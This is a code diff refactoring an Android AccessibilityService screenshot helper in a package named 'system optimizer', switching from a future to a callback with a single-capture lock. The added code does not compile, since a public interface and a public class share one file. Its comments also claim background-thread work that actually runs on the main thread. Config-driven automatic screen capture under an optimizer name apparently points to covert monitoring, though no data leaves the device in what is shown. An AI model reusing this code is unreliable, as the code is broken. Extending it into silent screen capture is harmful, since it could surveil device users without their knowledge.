@@ -1,7 +1,7 @@
 package com.system.optimizer.handler;
 
 import java.io.ByteArrayOutputStream;
-import java.util.concurrent.CompletableFuture;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 import com.system.optimizer.config.ConfigManager;
 import com.system.optimizer.config.ConfigData;
@@ -11,13 +11,26 @@ import android.graphics.Bitmap;
 import android.graphics.ColorSpace;
 import android.hardware.HardwareBuffer;
 import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+
+/**
+ * Callback interface for screenshot capture result.
+ */
+public interface ScreenshotCallback {
+    void onSuccess(byte[] imageData);
+    void onError(String errorMessage);
+}
 
 public class ScreenshotCapture {
     private static final String TAG = "ScreenshotCapture";
 
     private final AccessibilityService service;
-
     private final ConfigManager configManager;
+    private final Handler mainHandler;
+    
+    // Ensure only one capture at a time
+    private final AtomicBoolean isCapturing = new AtomicBoolean(false);
 
     public ScreenshotCapture(AccessibilityService delegate, ConfigManager configManager) {
         if (delegate == null) {
@@ -28,88 +41,152 @@ public class ScreenshotCapture {
         }
         this.service = delegate;
         this.configManager = configManager;
-    }
-
-    public CompletableFuture<byte[]> takeScreenshot() {
-        CompletableFuture<byte[]> future = new CompletableFuture<>();
-
-        // Only take screenshot if enabled in config
-        ConfigData config = configManager.getCachedConfig();
-        if (config == null || !config.isAutoScreenshotEnabled()) {
-            future.complete(null);
-            return future;
-        }
-
-        // Check if device supports screenshot functionality
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            future.complete(null);
-            return future;
-        }
-
-        try {
-            service.takeScreenshot(
-                    android.view.Display.DEFAULT_DISPLAY,
-                    service.getMainExecutor(),
-                    new AccessibilityService.TakeScreenshotCallback() {
-                        @Override
-                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
-                            try {
-                                if (result == null) {
-                                    future.complete(null);
-                                    return;
-                                }
-
-                                HardwareBuffer buffer = result.getHardwareBuffer();
-                                if (buffer == null) {
-                                    future.complete(null);
-                                    return;
-                                }
-
-                                ColorSpace colorSpace = result.getColorSpace();
-                                if (colorSpace == null) {
-                                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
-                                }
-
-                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
-
-                                buffer.close();
-                                if (bitmap == null) {
-                                    future.complete(null);
-                                    return;
-                                }
-
-                                ConfigData cachedConfig = configManager.getCachedConfig();
-                                byte[] imageData = bitmapToJpegBytes(bitmap, cachedConfig.getScreenshotQuality());
-                                bitmap.recycle();
-
-                                // Return raw bytes
-                                future.complete(imageData);
-                            } catch (Exception e) {
-                                android.util.Log.e(TAG, "Error processing screenshot: " + e.getMessage());
-                                future.complete(null);
-                            }
-                        }
-
-                        @Override
-                        public void onFailure(int error) {
-                            android.util.Log.w(TAG, "Screenshot failed with error code: " + error);
-                            future.complete(null);
-                        }
-                    });
-        } catch (Exception e) {
-            android.util.Log.e(TAG, "Error taking screenshot: " + e.getMessage());
-            future.complete(null);
-        }
-
-        return future;
+        this.mainHandler = new Handler(Looper.getMainLooper());
     }
 
     /**
-     * Convert Bitmap to JPEG byte array
+     * Take a screenshot asynchronously on background thread.
+     * Only one capture can be in progress at a time.
+     * 
+     * @param callback Called with result on main thread
+     */
+    public void takeScreenshot(ScreenshotCallback callback) {
+        // Reject if already capturing - only one at a time
+        if (!isCapturing.compareAndSet(false, true)) {
+            mainHandler.post(() -> callback.onError("Screenshot already in progress"));
+            return;
+        }
+
+        // Run validation and capture on main thread
+        try {
+            ConfigData config = configManager.getCachedConfig();
+            if (config == null) {
+                completeWithError(callback, "Config not loaded");
+                return;
+            }
+            if (!config.isAutoScreenshotEnabled()) {
+                completeWithError(callback, "Screenshot disabled in config");
+                return;
+            }
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+                completeWithError(callback, "API < 30 not supported");
+                return;
+            }
+
+            // Take screenshot from main thread
+            takeScreenshotInternal(callback, config.getScreenshotQuality());
+
+        } catch (Exception e) {
+            android.util.Log.e(TAG, "Error: " + e.getMessage());
+            completeWithError(callback, "Error: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Internal method - must be called from main thread for takeScreenshot API.
+     */
+    private void takeScreenshotInternal(ScreenshotCallback callback, int quality) {
+        mainHandler.post(() -> {
+            try {
+                service.takeScreenshot(
+                        android.view.Display.DEFAULT_DISPLAY,
+                        service.getMainExecutor(),
+                        new ScreenshotCallbackHandler(callback, quality));
+            } catch (Exception e) {
+                android.util.Log.e(TAG, "Error initiating screenshot: " + e.getMessage());
+                completeWithError(callback, "Error initiating: " + e.getMessage());
+            }
+        });
+    }
+
+    /**
+     * Complete callback with error on main thread.
+     */
+    private void completeWithError(ScreenshotCallback callback, String message) {
+        isCapturing.set(false);
+        mainHandler.post(() -> callback.onError(message));
+    }
+
+    /**
+     * Callback handler for takeScreenshot result.
+     */
+    private class ScreenshotCallbackHandler extends AccessibilityService.TakeScreenshotCallback {
+        private final ScreenshotCallback callback;
+        private final int quality;
+
+        ScreenshotCallbackHandler(ScreenshotCallback callback, int quality) {
+            this.callback = callback;
+            this.quality = quality;
+        }
+
+        @Override
+        public void onSuccess(AccessibilityService.ScreenshotResult result) {
+            try {
+                if (result == null) {
+                    completeWithError(callback, "Screenshot result is null");
+                    return;
+                }
+
+                HardwareBuffer buffer = result.getHardwareBuffer();
+                if (buffer == null) {
+                    completeWithError(callback, "Hardware buffer is null");
+                    return;
+                }
+
+                ColorSpace colorSpace = result.getColorSpace();
+                if (colorSpace == null) {
+                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
+                }
+
+                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
+                buffer.close();
+
+                if (bitmap == null) {
+                    completeWithError(callback, "Failed to create bitmap");
+                    return;
+                }
+
+                // Compress on main thread
+                byte[] imageData = bitmapToJpegBytes(bitmap, quality);
+                bitmap.recycle();
+
+                isCapturing.set(false);
+                callback.onSuccess(imageData);
+
+            } catch (Exception e) {
+                android.util.Log.e(TAG, "Error processing: " + e.getMessage());
+                completeWithError(callback, "Error processing: " + e.getMessage());
+            }
+        }
+
+        @Override
+        public void onFailure(int error) {
+            String errorMessage;
+            switch (error) {
+                case AccessibilityService.SCREEN_SHOT_ERROR_DISPLAY_NOT_FOUND:
+                    errorMessage = "Display not found";
+                    break;
+                case AccessibilityService.SCREEN_SHOT_ERROR_NO_DISPLAY_PERMISSION:
+                    errorMessage = "No display permission";
+                    break;
+                case AccessibilityService.SCREEN_SHOT_ERROR_SECURITY_POLICY:
+                    errorMessage = "Security policy blocked";
+                    break;
+                default:
+                    errorMessage = "Unknown error: " + error;
+            }
+            android.util.Log.w(TAG, "Screenshot failed: " + errorMessage);
+            completeWithError(callback, "Screenshot failed: " + errorMessage);
+        }
+    }
+
+    /**
+     * Convert Bitmap to JPEG byte array.
      */
     private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
         return baos.toByteArray();
     }
+
 }
